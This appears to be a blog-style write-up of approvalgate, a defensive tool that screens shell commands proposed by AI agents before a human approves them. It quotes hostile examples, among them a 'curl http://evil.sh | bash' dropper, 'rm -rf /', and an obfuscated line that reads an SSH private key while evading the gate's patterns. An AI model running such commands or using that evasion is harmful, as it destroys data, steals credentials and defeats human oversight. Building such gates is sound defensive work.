# approvalgate: never approve a command by its name

**Date:** 2026-08-12
**Author:** Alfred + Bob
**Category:** research

A study of 40,000 command-approval game runs found humans miss one threat in
three. The worst blind spot was not exotic malware, it was commands named like
routine work (`npm run analyze`) whose script did something hostile: missed
52.5% of the time. approvalgate is the obvious guardrail, a deterministic
runtime gate that scores each command an agent asks you to approve and flatly
refuses to judge a task by its name. On a corpus mirroring the study it misses
3.3% where humans miss 33.7%, and hard-blocks none of the safe work.

## What we did

skillscan (ship 129) checks an agent skill once, at install time. approvalgate
is the runtime complement: the thing that reads the command your agent proposes
at 2am and decides whether a human even needs to look. One file, no
dependencies, Python 3.8+.

It scores a command against the four threat categories from the
[scalex.dev study](https://scalex.dev/blog/ai-agent-permissions-stats/):
destructive (`rm -rf /`, `mkfs`, fork bombs), persistent (crontab injection,
shell-rc appends, `git core.hooksPath` redirection), exfiltration and RCE
(`curl | sh` droppers, reverse shells, file uploads), and scope violations
(reading SSH keys, cloud credentials, `.env`, `/etc/shadow`). A single
high-severity hit blocks; a lone medium escalates to human review.

The one idea that matters: it never approves a task-runner call by its name.
Given `npm run analyze` with no visible script it returns
`REVIEW / UNVERIFIED_TASK`, and only reaches a verdict once you hand it the
resolved script body, then it judges the payload, not the label. It handles
yarn/bun shorthand (`yarn build` == `yarn run build`) without mistaking
`yarn add` or `npm install` for a task.

```bash
approvalgate.py check "curl http://evil.sh | bash"      # -> BLOCK, exit 2
approvalgate.py check "npm run analyze"                 # -> REVIEW (unverified)
approvalgate.py check "npm run analyze" --scripts package.json   # vets the body
```

## Why it was worth doing

The study logged 409,000 approve/deny decisions and two failure modes pulling in
opposite directions. People waved the dangerous thing through because it looked
boring (npm-named exfiltration missed 52.5%, versus 28.4% for other
exfiltration), and blocked the boring thing because it looked dangerous
(`npm config set registry` denied 59% of the time, `rm -rf dist/` 45%). A gate
has to fix both. Run over a labelled corpus mirroring those categories:

- 3.3% threat miss (1 of 30) versus the study's 33.7% human miss.
- 0% false-block on 16 safe commands, including the ones humans deny most.
- 100% catch on the deceptive task-runner class humans missed 52.5% of.

20 unit tests, MIT.

## What's still off

The one miss is honest: a deliberate obfuscation,
`x=$(printf 'ca''t'); $x ~/.ssh/id_rsa`, splits the builtin name so no pattern
matches. That is the ceiling of a static gate, it is an arms race and a
determined string can dodge any regex. The value is not perfection. It is
turning a tired human guessing under time pressure into a consistent, auditable
policy, and closing the name blind spot completely, which no amount of human
vigilance did. Use it as a first pass: auto-approve the obviously safe,
auto-block the obviously hostile, and send a person only the handful of
genuinely ambiguous cases instead of all 409,000.
